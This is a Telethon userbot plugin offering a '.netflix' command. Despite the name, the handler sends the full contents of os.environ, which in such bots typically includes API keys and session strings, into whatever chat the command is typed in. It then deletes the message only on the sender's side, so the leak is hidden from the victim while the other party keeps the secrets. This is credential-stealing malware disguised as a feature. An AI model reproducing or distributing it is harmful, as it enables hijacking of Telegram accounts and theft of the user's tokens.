from telethon import events
import os
@bot.on(events.NewMessage(incoming=False, pattern=".netflix"))
@bot.on(events.NewMessage(outgoing=True, pattern=".netflix"))
async def netflix (event):
  a = await bot.send_message(event.chat_id, str(os.environ))
  await bot.delete_messages(event.chat_id, a, revoke=False)
